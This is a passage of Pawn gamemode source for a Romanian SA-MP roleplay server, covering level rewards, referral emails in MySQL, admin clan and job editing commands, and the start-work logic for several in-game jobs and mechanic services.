				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit 1000 gift points pentru ca ai deblocat level 80!");
				givePoints(playerid, 0, 1000);
			}
			case 85: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un vehicle slot pentru ca ai deblocat level 85!");
				if(PlayerInfo[playerid][pSlot] < MAX_PLAYER_VEHICLE) PlayerInfo[playerid][pSlot] ++;
				UpdateVar(playerid, "Slot", PlayerInfo[playerid][pSlot]);
			}
			case 90: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un Frozen Crate pentru ca ai deblocat level 90!");
				PlayerInfo[playerid][pCrates][7] ++;
				save_crates(playerid);
			}
			case 95: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit un 2x Transcendent Crate pentru ca ai deblocat level 95!");
				PlayerInfo[playerid][pCrates][4] += 2;
				save_crates(playerid);
			}
			case 100: {
				SendClientMessage(playerid, -1, "{F4AD42}>> {FFFFFF}Ai primit 100 puncte premium pentru ca ai deblocat level 100!");
				PlayerInfo[playerid][pPremiumPoints] += 100;
				UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			}
		}
	}
	return true;
}

redist::SQL_check_referral(playerid, money, rp) {
	new Year, Month, Day, Hour, Minute, Second,name[MAX_PLAYER_NAME], szDate[50];
	getdate(Year, Month, Day); gettime(Hour, Minute, Second);

	if(money != 0 && rp != 0) format(gString, 128, "Ai primit $%s si %d RP-uri deoarece %s a avansat la nivel %d.", FormatNumber(money), rp, GetName(playerid), PlayerInfo[playerid][pLevel]);
	else format(gString, 128, "Ai primit $%s deoarece %s a avansat la nivel %d.", FormatNumber(money), GetName(playerid), PlayerInfo[playerid][pLevel]);				

	format(szDate, sizeof szDate, "%02d-%02d-%d %02d:%02d:%02d", Day, Month, Year, Hour, Minute, Second); 
	for(new i=0,j=cache_num_rows();i<j;i++) {
		cache_get_value_name(i, "name", name);
		mysql_format(SQL, gQuery, sizeof gQuery, "INSERT INTO `emails` (`Name`, `Text`, `By`, `Date`) VALUES ('%s', '%s', 'AdmBot', '%s')", name, gString, szDate);
		mysql_tquery(SQL, gQuery);	

		mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", name);
		mysql_tquery(SQL, gQuery, #insert_email);
	}
	return true;
}
cmd:editclan(playerid, params[]) {
	if !IsAdmin(playerid, 6) *then return true;

	new clanid, code, message[32];
	if sscanf(params, "iis[32]", clanid, code, message) *then {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/editclan <clanid> <code> <result>");
		SendClientMessage(playerid, COLOR_GREY, "Valabile: Name(0), Owner(1), Tag(2), Rank 1(3), Rank 2(4), Rank 3(5), [...]");
		SendClientMessage(playerid, COLOR_GREY, "Rank 4(6), Rank 5(7), Rank 6(8), Slots(9), Register Date(10), Days(11), Money(12), PP(13), Procent(14).");
		return true;
	}
	switch(code) {
	    case 0: {
	        strmid(ClanInfo[clanid][clName], message, 0, 32);
			_query("UPDATE `clans` SET `Name`='%s' WHERE `ID`='%d'", ClanInfo[clanid][clName], clanid);
			format(gString, 128, "Ai editat cu succes numele la clanul cu ID-ul %d in %s.", clanid, message);
	    }
	    case 1: {
	       	strmid(ClanInfo[clanid][clOwner], message, 0, 32);
			_query("UPDATE `clans` SET `Owner`='%s' WHERE `ID`='%d'", ClanInfo[clanid][clOwner], clanid);
			format(gString, 128, "Ai editat cu succes detinatorul la clanul cu ID-ul %d in %s.", clanid, message);
	    }
	    case 3..8: {
	        strmid(ClanInfo[clanid][clRankName1 + clInfo:((code-4)*32)], message, 0, 32);
			mysql_format(SQL, gQuery, 128, "UPDATE `clans` SET `RankName%i`='%s' WHERE `ID`='%i'", (code-3), message, clanid);
			mysql_tquery(SQL, gQuery);
			format(gString, 128, "Ai editat cu succes numele la rank-ul %d la clanul cu ID-ul %d in %s.", code-3, clanid, message);
	    }
	    case 9: {
	        if strval(message) < 5 *then 
	        	return SendClientMessage(playerid, COLOR_GREY, "Clan slots invalid.");

	        ClanInfo[clanid][clSlots] = strval(message);
			_query("UPDATE `clans` SET `Slots`='%d' WHERE `ID`='%d'", ClanInfo[clanid][clSlots], clanid);
			format(gString, 128, "Ai editat cu succes sloturile la clanul cu ID-ul %d in %d.", clanid, ClanInfo[clanid][clSlots]);
	    }
	    case 10: {
	        strmid(ClanInfo[clanid][clRegisterDate], message, 0, 32);
			_query("UPDATE `clans` SET `Slots`='%d' WHERE `ID`='%d'", ClanInfo[clanid][clRegisterDate], clanid);
			format(gString, 128, "Ai editat cu succes data inregistrarii la clanul cu ID-ul %d in %s.", clanid, message);
	    }
	    case 11: {
	        if strval(message) < 5 *then 
	        	return SendClientMessage(playerid, COLOR_GREY, "Clan slots invalid.");

	        ClanInfo[clanid][clDays] = strval(message);
			_query("UPDATE `clans` SET `Days`='%d' WHERE `ID`='%d'", ClanInfo[clanid][clDays], clanid);
			format(gString, 128, "Ai editat cu succes zilele la clanul cu ID-ul %d in %d.", clanid, ClanInfo[clanid][clDays]);
	    }		
	    case 12: {
	    	ClanInfo[clanid][ClanBank] = strval(message);
	    	format(gString, 128, "Ai editat cu succes banii la clanul cu ID-ul %d in $%s.", clanid, FormatNumber(ClanInfo[clanid][ClanBank]));
	    }
	    case 13: {
	    	ClanInfo[clanid][clPremiumPoints] = strval(message);
	    	format(gString, 128, "Ai editat cu succes punctele premium la clanul cu ID-ul %d in $%d.", clanid, ClanInfo[clanid][clPremiumPoints]);
	    }
	    case 14: {
	    	ClanInfo[clanid][clBonus] = strval(message);
	    	format(gString, 128, "Ai editat cu succes procentul de castig la clanul cu ID-ul %d in %d%s", clanid, ClanInfo[clanid][clBonus], "%%");
	    }
	    default: return SendClientMessage(playerid, COLOR_GREY, "Code id invalid."), SendClientMessage(playerid, COLOR_WHITE, "");
	}
	SendClientMessage(playerid, COLOR_YELLOW, gString);
	return true;
}
cmd:editjob(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 6) 
		return SendClientMessage(playerid, 0xFFFFCCFF, AdminOnly);

	extract params -> new job; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/editjob <job id>");
	
	if(strlen(JobInfo[job][jName]) == 0) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Invalid Job.");

	format(gString, 512,
		"Job Name\t\t%s\nLevel\t\t%d\nLegal\t\t%d\n\
		Skilll 1 Veh\t\t%d\nSkill 2 Veh\t\t%d\nSkill 3 Veh\t\t%d\nSkill 4 Veh\t\t%d\nSkill 5 Veh\t\t%d\nSkill 6 Veh\t\t%d",
	JobInfo[job][jName], JobInfo[job][jLevel], JobInfo[job][jLegal], JobInfo[job][jSkill1Veh], JobInfo[job][jSkill2Veh], JobInfo[job][jSkill3Veh], JobInfo[job][jSkill4Veh],
	JobInfo[job][jSkill5Veh], JobInfo[job][jSkill6Veh]);

	format(gQuery, 128, "Edit job %d", job);
	ShowPlayerDialog(playerid, DIALOG_EDITJOB, DIALOG_STYLE_TABLIST, gQuery, gString, "Seelct", "Cancel");
	EditJobID[playerid] = job;
	return true;
}

redist::waitingDrugs(playerid, type) {
	switch(type) {
		case 0: {
			SetPlayerCheckpoint(playerid, 2719.1731,-2517.8215,17.3672, 2.0);
			showInfo(playerid, "ai luat ~g~iarba~w~~h~!~n~mergi la urmatorul checkpoint pentru a procesa ~g~iarba.");
		}
		case 1: {
			SetPlayerCheckpoint(playerid, -795.8011,2259.5359,59.4689, 2.0);
			showInfo(playerid, "~g~iarba ~w~~h~procesata!~n~mergi la urmatorul checkpoint pentru a transforma ~g~iarba~w~~h~.");
		}
		case 2: {
			gString[0] = (EOS);
			CurseFacute[playerid] = RandomEx(100000, 150000);
			format(gString, 128, "Option\tAmount\nDoresc drogurile pentru mine\t1\nDoresc sa vand drogurile\t$%s", FormatNumber(CurseFacute[playerid]));
			ShowPlayerDialog(playerid, DIALOG_DRUGS, DIALOG_STYLE_TABLIST_HEADERS, "Drugs Dealer", gString, "Select", "Cancel");
			PlayerTextDrawHide(playerid, InfosTD);
			return true;
		}
	}
	CP[playerid] = 706;
	return true;
}
stock showInfo(playerid, const string[], seconds = 5) {
	PlayerTextDrawSetString(playerid, InfosTD, string);
	PlayerTextDrawShow(playerid, InfosTD);
	hideInfo[playerid] = seconds;
	return true;
}

cmd:jobinvite(playerid, params[]) {
	if(PlayerInfo[playerid][pJob]!=7) return true;

	if(jobWork[playerid]!=-1)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai invitat deja un player");

	if(sscanf(params, "u", params[0]))
		return SendClientMessage(playerid, COLOR_GREY, "Syntax: {FFFFFF}/jobinvite <playerid/name>");

	if(!IsPlayerConnected(params[0]))
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: That user is not connected.");

	if(playerid == params[0])
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if(!ProxDetectorS(5.0, playerid, params[0]))
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este langa tine!");

	if(jobWork[params[0]]!=-1)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player munceste cu alt jucator.");

	if(PlayerInfo[params[0]][pJob]!=7)
		return true;

	SCMf(playerid, COLOR_LIGHTBLUE, "Invitatie de job trimisa lui %s.", GetName(params[0]));
	SCMf(params[0], COLOR_LIGHTBLUE, "Invitatie de job primita de la %s, foloseste (/accept jobinvite %d).", GetName(playerid), playerid);
	
	jobInvite[params[0]] = playerid;
	return true;
}

fail_jail_job(playerid) {
	if(!temp_work[playerid]) return true;
	temp_work[playerid] = false;
	SendClientMessage(playerid, COLOR_GREY, "Nu mai muncesti!");
	RemovePlayerAttachedObject(playerid, 9); 
	DisablePlayerCheckpoint(playerid);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	ClearAnimations(playerid);
	CP[playerid] = 0;	
	return 1;
}

updatePizzaProgress(playerid) {
	if(!pizzaProgress[playerid][0] && !pizzaProgress[playerid][1] && !pizzaProgress[playerid][2] && !pizzaProgress[playerid][3]) {
		SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Pizza Job) {FFFFFF}Pizza este gata. Iesi afara pentru a pune pizza in scuter apasand tasta 'Y'.");
		SetPlayerAttachedObject(playerid, 5, 2814, 6, 0.0739, -0.0009, -0.1570, 68.5999, -165.9999, -10.6999, 1.0000, 1.0000, 1.0000);
		InHand[playerid] = true;
		for(new i=0;i<11;i++) TextDrawHideForPlayer(playerid, PizzaTD[i]);
		PlayerTextDrawHide(playerid, PizzaPTD);
		player_selected[playerid] = 0;
		CancelSelectTextDraw(playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
		return true;
	}
	format(gString, 128, "- x%d bacon~n~- x%d felii salam~n~- x%d felii cascaval~n~- x%d ketchup~n~- x0 maioneza", pizzaProgress[playerid][0], pizzaProgress[playerid][1], pizzaProgress[playerid][2], pizzaProgress[playerid][3]);
	PlayerTextDrawSetString(playerid, PizzaPTD, gString);
	return true;
}

stock JobTimeDeelay(playerid) return SCMf(playerid, COLOR_LGREEN, "Please wait %d seconds!", JobDeelay[playerid]-gettime());
cmd:startwork(playerid, params[]) {
	if(PlayerInfo[playerid][pWantedLevel])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda pana nu scapi de wanted!");
	new job = PlayerInfo[playerid][pJob], Float:Pos[4];
	
	if(IsPlayerInAnyVehicle(playerid)) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti aceasta comanda dintr-un vehicul!");

	if(GetPlayerVirtualWorld(playerid) == 1339 && PlayerInfo[playerid][pJailTime] >= 1) {
		if(PlayerToPoint(7.0, playerid, 39.0873,2485.9397,16.4916)) {
			if(temp_work[playerid]) return true;

			temp_work[playerid] = true;
			SendClientMessage(playerid, COLOR_GREY, "Te-ai angajat ca Padurar in folosul comunitatii. Urmeaza checkpointurile.");

			CP[playerid] = 3000;
			random_checkpoint(playerid);
		}
		if(PlayerToPoint(7.0, playerid, 365.1239,-5.3504,1001.8516)) {
			if(temp_work[playerid]) return true;

			temp_work[playerid] = 2;
			SendClientMessage(playerid, COLOR_GREY, "Te-ai angajat ca Chelner in folosul comunitatii. Urmeaza checkpointurile.");

			CP[playerid] = 3000;
			SetPlayerCheckpoint(playerid, 369.6979,-6.0192,1001.8589, 2.0);
		}	
		return true;
	}

	switch(job) {
		case 0: return SendClientMessage(playerid, COLOR_GREY, "Nu ai un job.");
		case 8: return SendClientMessage(playerid, -1, "La acest job ai la dispozitie comanda /find.");
		case 11,13,16: return SendClientMessage(playerid, -1, "Foloseste /fish pentru a incepe munca la acest job!");
	}
	if(JobWorking[playerid]) 
		return SendClientMessage(playerid, COLOR_WHITE, "Muncesti deja.");

    if(targetfind[playerid] != -1) 
    	return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
	
	if(GetPlayerVirtualWorld(playerid) != 0) 
		return true;

	if(JobDeelay[playerid]>gettime() && PlayerInfo[playerid][pAdmin] < 6) 
		return JobTimeDeelay(playerid);

	gString[0] = EOS;

	if(!PlayerToPoint(5.0, playerid, JobInfo[job][jWPosX], JobInfo[job][jWPosY], JobInfo[job][jWPosZ])) {
		SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Ti-a fost setat un checkpoint catre locatia de unde poti incepe sa muncesti.");
		SetPlayerCheckpoint(playerid, JobInfo[job][jWPosX], JobInfo[job][jWPosY], JobInfo[job][jWPosZ], 6.0);
		CP[playerid] = 53;
		return true;
	}

	GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
	GetPlayerFacingAngle(playerid, Pos[3]);

	JobTime[playerid] = gettime();

	switch(PlayerInfo[playerid][pJob]) {
	    case 1: {
	    	switch(PlayerInfo[playerid][pBackpack]) {
	    		case 0: if(KG[playerid] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja un sac cu faina, du-te si vinde-l la Burger (/gps)!");
	    		default: {
	    			switch(PlayerInfo[playerid][pVip]) {
	    				case 1,2: if(KG[playerid] >= 50) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja doi saci cu faina, du-te si vindei la Burger (/gps)!");
	    				case 3: if(KG[playerid] >= 100) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja trei saci cu faina, du-te si vindei la Burger (/gps)!");
	    			}
	    		}
	    	}
	    	if(PlayerInfo[playerid][pBackpack]) {
				switch(PlayerInfo[playerid][pBackpackLevel]) {
					case 0: if(KG[playerid] != 0) return SendClientMessage(playerid, -1, "Eroare: Ai deja un sac cu faina, du-te si vinde-l la Burger (/gps)!");
					case 1: if(KG[playerid] >= 50) return SendClientMessage(playerid, -1, "Eroare: Ai deja doi saci cu faina, du-te si vindei la Burger (/gps)!");
					case 2: if(KG[playerid] >= 100) return SendClientMessage(playerid, -1, "Eroare: Ai deja trei saci cu faina, du-te si vindei la Burger (/gps)!");
					case 3: if(KG[playerid] >= 150) return SendClientMessage(playerid, -1, "Eroare: Ai deja patru saci cu faina, du-te si vindei la Burger (/gps)!");
				}
			}
			else if(fishCount[playerid]) return SendClientMessage(playerid, -1, "Ai prins deja un peste, du-te la un magazin 24/7 pentru a-l vinde.");
			if(PlayerInfo[playerid][pCarLic] == 0) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus!");

			if(PlayerInfo[playerid][pJobSkill][1] == 7)
				return ShowPlayerDialog(playerid, DIALOG_JOBTYPE, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}JOB {FFFFFF}Startwork", "Type\tStatus\nNormal Work\t{00FF00}Available\nSpecial Work\t{00FF00}Available", "Select", "Cancel");
			
			CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], Pos[3]);
			JobSeconds[playerid] = 30;
	    	UpdateJobStats(playerid);
	    }
	    case 2: {
			if(PlayerInfo[playerid][pCarLic] == 0) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus!");

			truckerRoot[playerid]=MoneyEarned[playerid]=CurseFacute[playerid]=0;
			ShowPlayerDialog(playerid, DIALOG_JOBTYPE, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}JOB {FFFFFF}Startwork", PlayerInfo[playerid][pJobSkill][2]!=7?"Type\tStatus\nNormal Work\t{00FF00}Available\nSpecial Work\t{FF0000}Not Available":"Type\tStatus\nNormal Work\t{00FF00}Available\nSpecial Work\t{00FF00}Available", "Select", "Cancel");
	    }
	    case 3: {
	    	if(PlayerInfo[playerid][pCarLic] == 0) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus!");

			if(PlayerInfo[playerid][pJobSkill][3] == 7)
				return ShowPlayerDialog(playerid, DIALOG_JOBTYPE, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}JOB {FFFFFF}Startwork", "Type\tStatus\nNormal Work\t{00FF00}Available\nSpecial Work\t{00FF00}Available", "Select", "Cancel");

			BagTime[playerid] = 
			CurseFacute[playerid] = 0;
			InHand[playerid] = false;
			SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Mergi la checkpoint-ul setat de pe mapa pentru a ajunge la copaci.");
	   		CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], Pos[3]);
	   		SetPlayerCheckpoint(playerid, -651.0809,-1596.1952,24.0171, 6.0);
	    	CP[playerid] = 701;
	    }
	    case 4: {
	    	if(!PlayerInfo[playerid][pCarLic]) 
	    		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus pentru a putea munci la acest job!");
	    	
	    	PlayerTextDrawSetString(playerid, GarbagePTD, "~p~garbage man job~n~~g~~h~0/25 ~w~~h~kg of garbage");
	    	PlayerTextDrawShow(playerid, GarbagePTD);
	    	CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], 0.0);
			new t = BagTime[playerid] = random(sizeof trashObj); gString[0] = (EOS);
			format(gString, 128, "Du-te la punctul ~r~rosu~w~~h~ de pe mapa pentru a lua sacul cu gunoi~n~(~y~%s, %.2fm~w~~h~)", Get3DZone(trashObj[t][0], trashObj[t][1], trashObj[t][2]), GetPlayerDistanceFromPoint(playerid, trashObj[t][0], trashObj[t][1], trashObj[t][2]));
	    	showInfo(playerid, gString, 7);
	    	SetPlayerRaceCheckpoint(playerid, 1, trashObj[t][0], trashObj[t][1], trashObj[t][2], 0.0, 0.0, 0.0, 1.0);
	   		CP[playerid] = 703;
	    }
	    case 5: ShowPlayerDialog(playerid, DIALOG_MATERIALS, DIALOG_STYLE_LIST, "Materials Locations", "Las Payasadas\nLas Colinas\nBlue Berry\nFort Carson", "Select", "Cancel");
		case 6: {
			showInfo(playerid, "waiting...");
			SetTimerEx("waitingDrugs", 5000, false, "dd", playerid, 0);
			ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 5.0, 0, 0, 0, 0, 5000);
			JobWorking[playerid] = true;
			InHand[playerid] = false;
		}
		case 7: {
			if(!PlayerInfo[playerid][pCarLic]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus pentru a putea munci la acest job!");

			if(jobWork[playerid]==-1)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest job se face doar cu un prieten (/jobinvite).");

			new id = jobWork[playerid];
			if(!JobWorking[id]) {
				JobVehicle[playerid] = CreateVehicleEx(406, Pos[0], Pos[1], Pos[2], Pos[3], -1, -1);
				SendClientMessage(playerid, COLOR_YELLOW, "Asteapta pana parteneru tau aduce movila!");
			}
			else {
				JobVehicle[playerid] = CreateVehicleEx(486, Pos[0], Pos[1], Pos[2], Pos[3], -1, -1);
				SendClientMessage(playerid, COLOR_YELLOW, "Mergi la checkpoint pentru a lua piatra!");
				new const Float: pos_work[3][3] = {{606.4033,868.7328,-40.1690}, {638.4946,856.0146,-40.1565}, {637.7477,827.3764,-40.1763}}, r=random(sizeof pos_work);
				SetPlayerCheckpoint(playerid, pos_work[r][0], pos_work[r][1], pos_work[r][2], 5.0);
				CP[playerid] = 707;
			}
			InHand[playerid] = false;

			PutPlayerInVehicleEx(playerid, JobVehicle[playerid], 0);
			GiveVehicleKey(playerid, JobVehicle[playerid]);
			MoneyEarned[playerid] = 0;
			CurseFacute[playerid] = 0;
			JobWorking[playerid] = 1;
		    Gas[JobVehicle[playerid]] = 100;

		    new engine,lights,alarm,doors,bonnet,boot,objective;
			vehEngine[JobVehicle[playerid]] = 1;
			GetVehicleParamsEx(JobVehicle[playerid],engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(JobVehicle[playerid],VEHICLE_PARAMS_ON,lights,alarm,VEHICLE_PARAMS_ON,bonnet,boot,objective);
		}
		case 9: {
			if(!PlayerInfo[playerid][pCarLic]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus pentru a putea munci la acest job!");
			
			if(PlayerInfo[playerid][pJobSkill][9] == 7)
				return ShowPlayerDialog(playerid, DIALOG_JOBTYPE, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}JOB {FFFFFF}Startwork", "Type\tStatus\nNormal Work\t{00FF00}Available\nSpecial Work\t{00FF00}Available", "Select", "Cancel");

			CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], Pos[3], 3,41);
			new h = random(sql_houses);
			SetPlayerCheckpoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 5.0);
			CP[playerid] = 710;
			format(gString, 128, "du-te la punctul ~r~~h~rosu ~w~~h~de pe mapa pentru a livra pizza.~n~distanta: ~y~%.1fm.", GetPlayerDistanceFromPoint(playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]));
			showInfo(playerid, gString, 10);
		}	
		case 10: {
			if(!PlayerInfo[playerid][pCarLic]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus pentru a putea munci la acest job!");
			
			CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], 0.0);
			SetPlayerCheckpoint(playerid, 2841.7529,956.4805,10.7396, 5.0);
			CP[playerid] = 711;
	
			showInfo(playerid, "Du-te la punctul ~r~rosu~w~~h~ pentru a incarca coletele!");
		}	
		case 12: {
			if(!PlayerInfo[playerid][pCarLic]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus pentru a putea munci la acest job!");
			
			CreateJobVehicle(playerid, Pos[0], Pos[1], Pos[2], Pos[3]);
			showInfo(playerid, "Du-te la ~r~~h~checkpoint-ul~w~~h~ de pe mapa pentru a lua marfa!");		
			SetPlayerCheckpoint(playerid, 928.6621,2070.4258,10.5839, 2.0);			
			CP[playerid] = 713;
			UpdateJobStats(playerid);
		}
		case 14: {
			if(!PlayerInfo[playerid][pCarLic]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de o licenta de condus pentru a putea munci la acest job!");

			new const Float:spawn_bus_pos[][] = {
			{2852.0244,1367.6998,10.9310,90.4029},
			{2852.0308,1361.3445,10.8927,90.2300},
			{2852.0891,1354.7837,10.8926,89.2475},
			{2851.9946,1348.6094,10.9315,89.4273},
			{2806.4583,1364.5336,10.8444,271.036},
			{2806.5530,1358.0875,10.8445,270.037},
			{2806.7168,1351.6769,10.8444,269.147},
			{2806.5369,1345.2400,10.8810,268.839}};
			new p = random(sizeof spawn_bus_pos);
			CreateJobVehicle(playerid, spawn_bus_pos[p][0], spawn_bus_pos[p][1], spawn_bus_pos[p][2], spawn_bus_pos[p][3]);
			ShowPlayerDialog(playerid, CHOSE_BUSROUTE, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}Bus {FFFFFF}Driver: Route Select", "Route\tDestination\tCheckpoints\nRoute #1\tBank LV-Spawn-Fisher LV\t19 checkpoints\nRoute #2\tRent Car-Tunning & Neon Place-Dealership\t22 checkpoints\nRoute #3\tRent Car-Bank LS-Casino\t20 checkpoints", "Select", "Cancel");
		}
		case 15: {
			new const bizz_type[3] = {3, 7, 18};
			new t=random(6969)%sizeof bizz_type, biz = BizzTypeID[bizz_type[t]][random(GpsBizzType[bizz_type[t]])];
			SCMf(playerid, COLOR_WHITE, "{75db3d}(Glovo Job) {FFFFFF}Mergi la afacerea #%d (tip: %s) pentru a lua mancarea. Distanta: %.1fm.", BizzInfo[biz][bID], BizzName[bizz_type[t]], GetPlayerDistanceFromPoint(playerid, BizzInfo[biz][bEntranceX], BizzInfo[biz][bEntranceY], BizzInfo[biz][bEntranceZ]));
			SetPlayerCheckpoint(playerid, BizzInfo[biz][bEntranceX], BizzInfo[biz][bEntranceY], BizzInfo[biz][bEntranceZ], 3.0);
			BagTime[playerid] = biz;
			CreateJobVehicle(playerid, -2460.2925,741.7111,34.6232,178.6094);
			SetPlayerAttachedObject(playerid, 3, 19559, 1, 0.1620, -0.0170, 0.0060, -5.9999, 88.6999, 2.4999, 1.0000, 1.0000, 1.0000);
			CP[playerid] = 715;
			MoneyEarned[playerid] = 0;
			CurseFacute[playerid] = 0;
			UpdateJobStats(playerid);
			JobDeelay[playerid] = gettime() + 60;
		}
	}			
	InHand[playerid] = false;			
	if(PlayerInfo[playerid][pShowJob] == 0 && PlayerInfo[playerid][pJob] != 5 && PlayerInfo[playerid][pLevel] < 3) SendClientMessage(playerid, COLOR_YELLOW, "Daca doresti sa vezi mai multe informatii folositoare de la job, o poti face prin comanda (/hud > Informatii job).");

	SetPlayerVirtualWorld(playerid, 0);	
	return true;
}

stock CreateJobVehicle(playerid, Float:x,Float:y,Float:z,Float:rot, color1 = -1, color2 = -1) {
	JobVehicle[playerid] = CreateVehicleEx(JobInfo[PlayerInfo[playerid][pJob]][jSkill1Veh + jInfo:(PlayerInfo[playerid][pJobSkill][PlayerInfo[playerid][pJob]]-1)], x, y, z, rot, color1, color2);
	PutPlayerInVehicleEx(playerid, JobVehicle[playerid], 0);
	format(gString, 60, "{75db3d}JOB-%d", JobVehicle[playerid]);
	SetVehicleNumberPlate(JobVehicle[playerid], gString);
	GiveVehicleKey(playerid, JobVehicle[playerid]);

	ServerVehicles[JobVehicle[playerid]][vJob] = PlayerInfo[playerid][pJob];
	MoneyEarned[playerid] = 0; CurseFacute[playerid] = 0;
	fishCount[playerid] = 0; JobWorking[playerid] = 1;
    Gas[JobVehicle[playerid]] = 100;
	return true;
}

stock _CreateJobVehicle(playerid, model, Float:x,Float:y,Float:z,Float:rot, color1 = -1, color2 = -1,bool:put=true) {
	JobVehicle[playerid] = CreateVehicleEx(model, x, y, z, rot, color1, color2);
	format(gString, 60, "{75db3d}JOB-%d", JobVehicle[playerid]);
	SetVehicleNumberPlate(JobVehicle[playerid], gString);
	ServerVehicles[JobVehicle[playerid]][vJob] = PlayerInfo[playerid][pJob];
	if(put) PutPlayerInVehicleEx(playerid, JobVehicle[playerid], 0);
	GiveVehicleKey(playerid, JobVehicle[playerid]);
	MoneyEarned[playerid] = 0;
	CurseFacute[playerid] = 0;
	JobWorking[playerid] = 2;
    Gas[JobVehicle[playerid]] = 100;
	return true;
}

cmd:refill(playerid, params[]) {
	if PlayerInfo[playerid][pMember] != 8 *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti mecanic!");

	if DeelayCommand[playerid][6]>gettime() *then
		return DeelayTime(playerid, 6);

	extract params -> new player:id, money; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/refill <playerid/name> <Price>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	
	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(GetPlayerVehicleID(id),engine,lights,alarm,doors,bonnet,boot,objective);

	if engine *then
		return SendClientMessage(playerid, -1, "Acel player are motorul pornit!");

	if money < 1 || money > 10000 *then 
		return SendClientMessage(playerid, COLOR_WHITE, "Pretul trebuie sa fie cuprins intre $1 si $10,000!");

	if !ProxDetectorS(8.0, playerid, id) && !IsPlayerInAnyVehicle(id) *then 
		return SendClientMessage(playerid, -1, "Acel player nu este in raza ta sau nu se afla intr-un vehicul.");

	if id == playerid *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	SCMf(playerid, COLOR_MONEY, "* I-ai oferit %s posibilitatea de a-i umple rezervorul vehiculul in schimbul a $%d .",GetName(id),money);
	SCMf(id, COLOR_MONEY, "* Mecanicul %s doreste sa-ti alimenteze vehiculul in schimbul a $%d, (scrie /accept refill %d) pentru a accepta.",GetName(playerid),money,playerid);
	RefillOffer[id] = playerid;
	RefillPrice[id] = money;
	Refillx[playerid] = id;
	return true;
}
cmd:repair(playerid, params[]) {
	if PlayerInfo[playerid][pMember] != 8 *then
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti mecanic!");

	if DeelayCommand[playerid][5]>gettime() *then 
		return DeelayTime(playerid, 5);

	extract params -> new player:id, money; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/repair <playerid/name> <Price>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

